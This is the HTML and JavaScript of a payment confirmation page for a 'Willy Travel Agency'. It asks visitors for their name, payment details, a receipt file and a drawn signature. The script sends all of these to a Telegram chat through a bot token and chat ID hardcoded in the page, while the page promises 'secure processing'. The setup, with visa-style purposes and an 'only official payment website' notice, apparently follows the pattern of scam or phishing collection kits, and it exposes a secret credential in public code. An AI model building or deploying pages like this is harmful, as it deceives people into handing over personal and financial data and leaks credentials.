<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Willy Travel â€” Payment Confirmation</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --primary:#0b6cf3;
  --bg:#f5f7fb;
  --card:#ffffff;
  --muted:#6b7280;
  --radius:14px;
}
*{box-sizing:border-box;margin:0;padding:0}
body{
  font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue";
  background:var(--bg);padding:32px;display:flex;justify-content:center;min-height:100vh;color:#0f1724
}
.container{width:100%;max-width:1100px}

/* Legal certified document */
.legal-doc{display:flex;justify-content:center;margin-bottom:14px}
.legal-doc img{max-width:250px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.1)}

/* Notice */
.notice{
  font-weight:500;
  background:#fff3f0;
  border-left:4px solid #ff6b3d;
  box-shadow:0 4px 12px rgba(0,0,0,0.05);
  padding:12px 14px;
  border-radius:10px;
  margin-bottom:14px;
  font-size:13px;
}

/* Top section */
.top{display:flex;gap:16px;align-items:center;margin-bottom:18px;flex-wrap:wrap}
.brand{
  border:1px solid #e6eefb;
  background:linear-gradient(180deg,#ffffff,#f3f6fb);
  padding:16px;border-radius:12px;
  display:flex;gap:12px;align-items:center;
  box-shadow:0 12px 36px rgba(12,20,40,0.06);flex:1
}
.logo{
  width:64px;height:64px;border-radius:12px;
  background:linear-gradient(90deg,#0b6cf3,#5b8df6);
  display:flex;align-items:center;justify-content:center;
  color:#fff;font-weight:700;font-size:22px
}
h1{font-size:18px;margin-bottom:2px}
.muted{color:var(--muted);font-size:13px}
.flags img{
  width:36px;height:24px;border-radius:4px;border:1px solid #e6eefb;
  box-shadow:0 2px 6px rgba(0,0,0,0.15);
  transition: transform 0.2s;
}
.flags img:hover{transform: scale(1.1)}

.methods{display:flex;gap:10px;align-items:center}
.method{
  background:#fff;padding:8px 10px;border-radius:10px;
  box-shadow:0 6px 18px rgba(2,6,23,0.06);
  display:flex;gap:8px;align-items:center;border:1px solid #eef2ff
}

/* Grid layout */
.grid{display:grid;grid-template-columns:1fr 360px;gap:20px;align-items:start}
@media(max-width:900px){
  .grid{grid-template-columns:1fr}
  .methods{display:none}
}

/* Card */
.card{
  background:var(--card);padding:20px;border-radius:14px;
  box-shadow:0 18px 44px rgba(2,6,23,0.06)
}
label{display:block;font-weight:600;color:#0f1724;margin-top:12px;font-size:14px}
input,select{
  width:100%;padding:12px;border-radius:10px;
  border:1px solid #e6eefb;margin-top:8px;font-size:15px;background:#fff
}

/* File preview */
.file-control{display:flex;gap:12px;align-items:center}
.preview{margin-top:12px;display:flex;gap:12px;align-items:center;flex-wrap:wrap}
.preview img{
  max-width:160px;max-height:120px;border-radius:10px;
  border:1px solid #e6eefb;object-fit:contain
}
.filemeta{color:var(--muted);font-size:13px}

/* Signature pad */
.sig-pad{
  margin-top:10px;border-radius:10px;
  background:linear-gradient(180deg,#fbfdff,#fff);
  border:1px solid #e6eefb;padding:8px
}
canvas{width:100%;height:160px;border-radius:8px;display:block;background:#fff}
.controls{display:flex;gap:10px;margin-top:10px}
.btn{
  padding:10px 14px;border-radius:10px;border:none;
  font-weight:600;cursor:pointer
}
.btn-ghost{background:#f8fafc;border:1px solid #e6eefb}
.btn-primary{
  background:var(--primary);color:#fff;padding:12px 18px;border-radius:12px;
  border:none;cursor:pointer;box-shadow:0 12px 30px rgba(11,108,243,0.14)
}

/* Summary */
.summary-card{
  background:linear-gradient(180deg,#fff,#f8fafc);padding:16px;
  border-radius:12px;border:1px solid #eef6ff;
  box-shadow:0 14px 36px rgba(11,108,243,0.06)
}
.summary-card h3{margin-bottom:8px}
.row{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
.small{font-size:13px;color:var(--muted)}

/* Modal */
.modal-backdrop{
  position:fixed;inset:0;background:rgba(2,6,23,0.55);
  display:flex;align-items:center;justify-content:center;
  z-index:60;opacity:0;pointer-events:none;transition:all .18s ease
}
.modal-backdrop.show{opacity:1;pointer-events:auto}
.modal{
  background:#fff;padding:20px;border-radius:12px;
  max-width:480px;width:92%;text-align:center;
  box-shadow:0 24px 60px rgba(2,6,23,0.28)
}
.ok{
  background:var(--primary);color:#fff;padding:10px 14px;
  border-radius:10px;border:none;font-weight:700;cursor:pointer
}
footer{
  margin-top:18px;text-align:center;color:var(--muted);font-size:13px
}
</style>
</head>
<body>
<div class="container">

  <!-- Legal certified document -->
  <div class="legal-doc">
    <img src="nete.png" alt="Photo">
  </div>

  <div class="notice">
    This page is our only official payment receive website. WILLY TRAVEL AGENCY is not responsible for payments made outside of this website.
  </div>

  <div class="top">
    <div class="brand">
      <div class="logo">WT</div>
      <div>
        <h1>Willy Travel Agency</h1>
        <div class="muted">Secure â€¢ Verified â€¢ Professional</div>
        <div class="muted">Bank: Ethiopian Commercial Bank</div>
      </div>
    </div>
    <div class="flags">
      <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">
      <img src="https://upload.wikimedia.org/wikipedia/commons/c/cf/Flag_of_Canada.svg">
    </div>
  </div>

  <div class="grid">
    <section class="card">
      <form id="paymentForm" novalidate>
        <h2>Payment Confirmation</h2>

        <label for="fullName">Full Name</label>
        <input id="fullName" type="text" required>

        <label for="email">Email (optional)</label>
        <input id="email" type="email">

        <label for="paymentPurpose">Payment Purpose</label>
        <select id="paymentPurpose" required>
          <option value="" disabled selected>Select purpose</option>
          <option value="To Start Processes">To Start Processes</option>
          <option value="To Acceptance Letter">To Acceptance Letter</option>
          <option value="To Passport">To Passport</option>
        </select>

        <label for="method">Payment Method</label>
        <select id="method" required>
          <option value="Bank Transfer">Bank Transfer</option>
          <option value="Mobile Money">Mobile Money</option>
        </select>

        <label for="amount">Amount Paid (ETB)</label>
        <input id="amount" type="number" min="0" required>

        <label for="receipt">Payment Screenshot or Receipt</label>
        <input id="receipt" type="file" accept="image/*,application/pdf" required>

        <div id="filePreview" class="preview" style="display:none"></div>

        <div style="margin-top:10px;font-weight:600">Draw Signature</div>
        <div class="sig-pad"><canvas id="signaturePad"></canvas></div>

        <div class="controls">
          <button type="button" id="clearSig" class="btn btn-ghost">Clear</button>
          <button type="button" id="downloadSig" class="btn btn-ghost">Download</button>
        </div>

        <button id="submitBtn" class="btn-primary" type="submit">Submit securely</button>
      </form>
    </section>

    <aside class="summary-card">
      <h3>Submission Summary</h3>
      <div class="row"><div class="small">Name:</div><div id="sumName">â€”</div></div>
      <div class="row"><div class="small">Purpose:</div><div id="sumPurpose">â€”</div></div>
      <div class="row"><div class="small">Method:</div><div id="sumMethod">â€”</div></div>
      <div class="row"><div class="small">Amount:</div><div id="sumAmount">â€”</div></div>
    </aside>
  </div>

  <footer>Â© Willy Travel Agency â€” Secure processing</footer>
</div>

<!-- Modal -->
<div id="modalBackdrop" class="modal-backdrop">
  <div class="modal">
    <h3>Submission received</h3>
    <p>Thank you. Our team will contact you shortly.</p>
    <button id="modalOk" class="ok">OK</button>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>
<script>
const BOT_TOKEN = "8551640145:AAEufXhca7k5Wbixlq5HfooYCsnd3oFEes8";
const CHAT_ID = "7956760590";
const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

const canvas = document.getElementById('signaturePad');
const signaturePad = new SignaturePad(canvas, { backgroundColor:'rgba(255,255,255,0)' });

function resizeCanvas(){
  const ratio = Math.max(window.devicePixelRatio||1,1);
  canvas.width = canvas.offsetWidth * ratio;
  canvas.height = 160 * ratio;
  canvas.getContext('2d').scale(ratio,ratio);
  signaturePad.clear();
}
window.addEventListener('resize',resizeCanvas);
resizeCanvas();

document.getElementById('clearSig').addEventListener('click',()=>signaturePad.clear());
document.getElementById('downloadSig').addEventListener('click',()=>{
  if(signaturePad.isEmpty()) return alert("Signature is empty.");
  const a=document.createElement('a');
  a.href=signaturePad.toDataURL("image/png");
  a.download="signature.png";
  a.click();
});

// Preview file
const filePreview=document.getElementById('filePreview');
document.getElementById('receipt').addEventListener('change',()=>{
  const f = receipt.files[0];
  filePreview.innerHTML="";
  if(!f) return;

  if(f.type.startsWith("image/")){
    const img=document.createElement("img");
    img.src=URL.createObjectURL(f);
    img.onload=()=>URL.revokeObjectURL(img.src);
    filePreview.appendChild(img);
  } else {
    const meta=document.createElement("div");
    meta.className='filemeta';
    meta.textContent = `Uploaded: ${f.name} (${Math.round(f.size/1024)} KB)`;
    filePreview.appendChild(meta);
  }

  filePreview.style.display="flex";
});

// Send to Telegram
async function sendToTelegram(text, file, signatureBlob){
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({ chat_id:CHAT_ID, text:text, parse_mode:"HTML" })
  });

  if(file){
    const fd=new FormData();
    fd.append("chat_id",CHAT_ID);
    fd.append("document",file);
    await fetch(TELEGRAM_URL,{ method:"POST", body:fd });
  }

  if(signatureBlob){
    const fd2=new FormData();
    fd2.append("chat_id",CHAT_ID);
    fd2.append("document",signatureBlob,"signature.png");
    await fetch(TELEGRAM_URL,{ method:"POST", body:fd2 });
  }
}

// Form submit
document.getElementById('paymentForm').addEventListener("submit", async(e)=>{
  e.preventDefault();

  const name=document.getElementById("fullName").value;
  const email=document.getElementById("email").value;
  const purpose=document.getElementById("paymentPurpose").value;
  const method=document.getElementById("method").value;
  const amount=document.getElementById("amount").value;
  const receiptFile=document.getElementById("receipt").files[0];

  if(!receiptFile) return alert("Please upload receipt.");

  let signatureBlob=null;
  if(!signaturePad.isEmpty()){
    const dataURL=signaturePad.toDataURL("image/png");
    const response=await fetch(dataURL);
    signatureBlob=await response.blob();
  }

  const msg = `
<b>ðŸ“¨ New Payment Submitted</b>

<b>Name:</b> ${name}
<b>Email:</b> ${email || "â€”"}
<b>Purpose:</b> ${purpose}
<b>Method:</b> ${method}
<b>Amount:</b> ${amount} ETB
  `;

  await sendToTelegram(msg, receiptFile, signatureBlob);

  document.getElementById("modalBackdrop").classList.add("show");
  e.target.reset();
  signaturePad.clear();
  filePreview.innerHTML="";
  filePreview.style.display="none";
});

document.getElementById("modalOk").addEventListener("click",()=>{
  document.getElementById("modalBackdrop").classList.remove("show");
});
</script>

</body>
</html>